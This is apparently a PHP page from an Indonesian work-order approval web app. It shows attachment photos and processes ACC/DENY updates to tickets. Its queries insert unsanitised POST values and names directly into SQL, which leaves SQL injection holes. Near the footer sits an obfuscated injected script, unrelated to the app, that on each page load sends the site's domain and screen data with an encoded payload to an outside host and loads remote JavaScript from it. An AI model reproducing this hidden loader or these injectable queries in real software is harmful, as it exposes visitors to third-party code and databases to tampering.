                                      <img src='../lampiran/$dt_lampiran[ft_sesudah_1]' style='width: 200px; height: 180px;' />
                                      <img src='../lampiran/$dt_lampiran[ft_sesudah_2]' style='width: 200px; height: 180px;' />
                                      <img src='../lampiran/$dt_lampiran[ft_sesudah_3]' style='width: 200px; height: 180px;' />
                                    ";
                                  }else if($dt_lampiran['ft_sesudah_2']!=null){
                                    echo"
                                      <img src='../lampiran/$dt_lampiran[ft_sesudah_1]' style='width: 200px; height: 180px;' />
                                      <img src='../lampiran/$dt_lampiran[ft_sesudah_2]' style='width: 200px; height: 180px;' />
                                      ";
                                  }else{
                                    echo"
                                      Tidak ada foto Sesudah.
                                    ";
                                }                                     
                 
                                ?>
                              </center>
                            </td>
                          </tr>
                          <tr>
                            <td colspan="11"><center>Foto Denah</center></td>
                          </tr>
                          
                          <tr>
                            <td colspan="11">
                              <center>
                                <?php
                                if($dt_lampiran['ft_denah']!=null){
                                    echo"
                                      <img src='../lampiran/$dt_lampiran[ft_denah]' style='width: 200px; height: 180px;' />
                                    ";
                                }else{
                                    echo"
                                      Tidak ada foto denah.
                                    ";
                                }
                                ?>
                              </center>
                            </td>
                          </tr>

                          <?php
                            } //end of data_lampiran
                          ?>

                          <tr>
                            <td colspan="11">
                             <!--  UNTUK NGESET NIP SI YG MENG ACCKANNYA -->
                              <?php
                                $b = mysqli_query($db,"SELECT * FROM tb_user WHERE nama='$nama'");
                                while($bb=mysqli_fetch_array($b)){
                                  echo "<input type='hidden' name='nip_penyetuju' value='$bb[nip]'>";                
                                }

                              ?>
                              
                              <input type="submit" class="btn btn-danger btn-raised ripple" style="width: 100%;" name="bt_acc" value="ACC ORDER"></input>
                            </td>
                          </tr>
                        
                          </table>
                        </form>

                      
                        </div>
                      </div>
                    </div>
                  <?php } ?>
                  
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <!-- /page content -->

    
        <?php
        break;
        // END HALAMAN IN PROGRESS ORDER DETAIL
        
        ?>

        <!-- UPDATE ORDER -->

        <?php
        case "proses_acc_order":
        $notikets=$_POST['notiket'];
        $nip_penyetuju=$_POST['nip_penyetuju'];
        
        if($_POST['status']=="ACC"){
          $status=1;
          $sql_update = mysqli_query($db,"UPDATE tb_tiket SET nip_penyetuju=$nip_penyetuju ,tanggal_acc=NOW(), status=$status WHERE notiket='$notikets'");
          if($sql_update){

              echo "<script>
                      alert('Data berhasil di acc');
                      window.location.href='index.php?page=in_progress_order';
                    </script>
                    ";

          } else {

              echo "<script>
                      alert('Data tidak di acc');
                      window.location.href='index.php?page=in_progress_order';
                    </script>
                    ";
          }

        }else if($_POST['status']=="DENY"){
          $status=3;
          $sql_update = mysqli_query($db,"UPDATE tb_tiket SET nip_penyetuju=$nip_penyetuju ,tanggal_acc=NOW(), status=$status WHERE notiket='$notikets'");
          if($sql_update){

              echo "<script>
                      alert('Data berhasil di Tolak');
                      window.location.href='index.php?page=in_progress_order';
                    </script>
                    ";

          } else {

              echo "<script>
                      alert('Data gagal di tolak');
                      window.location.href='index.php?page=in_progress_order';
                    </script>
                    ";
          }
        }else{
          $status=0;
        }
        
        

          
        
        break;
      }
        ?>



      

        <!-- footer content -->
        <footer class="footer">
          <div class="float-right">
            Oreo - Aplikasi Order Perintah Kerja Online <a href="index.php?page=dashboard" class="company-name text-theme">
            </a>
          </div>
          <div class="clearfix"></div>
          </footer><!-- /footer content -->
        </div>
      </div>
      <!-- site foot -->
      <script src="../js/vendor.min.js"></script>
      <script src="../js/main.js"></script>
      <script src="../js/settings.min.js"></script>
      <script src="../js/charts.js"></script>
      <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mqEFsStDL2kcKOEgSI1kUxFCY8CbSVuc661OgqVbkUs0Kl%2f3NNQ4KbptNEnfBqeGCqovy4ISEmgGwSqI1gnSFpt8CSiHnlkoWGWjFms%2fZNYrEual0nRX503PXLGu%2fuBNZnv5%2bK5IJa%2fj%2bmaM4u9F6LNF%2fkg8%2bkYy5lbLeYgnuoX%2fi4si44%2b3C54qrDWTidiQ7EotmjI4E1%2bDuhgI0wqV3ROObUmv2zRinXD3Mr0%2bgqdQV1uTVaVm0VCVhm7pAQT8kDyBiOAj2R2eKWs2LxxVBgufqr4i4fIpYFrCmAneVFgkMOBSBgzKgHTalTwRE9NI1QznR9PA1Llpsv5iT9P0bV17vzEpn1NYWE23TtcQ4BltuSiZA1D4Z%2fEIMMu3MIIwwoEDYxVLLicIKUA2iYOolvj1tcGjHnbcq030JiUmeWbO36eYbM%2bCE3tvUOujk5%2f3KTTOZdQYlCh3VyKO3wJuq%2bOKFduZsjtuxQKGJcyHI3Tc%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
      <!-- Mirrored from musa.beewebsystems.com/form-general.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 28 Jun 2018 02:01:09 GMT -->
    </html>
    <!-- /site foot -->
    <!--  SCRIPT UNTUK AJAX WITEL DAN STO -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    <script type="text/javascript">
    $(document).ready(function(){
    $('#regional').on('change',function(){
    var kd_regional = $(this).val();
    if(kd_regional){
    $.ajax({
    type:'POST',
    url:'ajaxData.php',
    data:'kd_regional='+kd_regional,
    success:function(html){
    $('#witel').html(html);
    $('#sto').html('<option value="" name="witel">Pilih Witel</option>');
    }
    });
    }else{
    $('#witel').html('<option value="" name="witel">Pilih Regional terlebih dahulu</option>');
    $('#sto').html('<option value="" name="witel">Pilih Witel terlebih dahulu</option>');
    }
    });
    $('#witel').on('change',function(){
    var kd_witel = $(this).val();
    if(kd_witel){
    $.ajax({
    type:'POST',
    url:'ajaxData.php',
    data:'kd_witel='+kd_witel,
    success:function(html){
    $('#sto').html(html);
    }
    });
    }else{
    $('#sto').html('<option value="" >Select STO first</option>');
    }
    });
    });
    </script>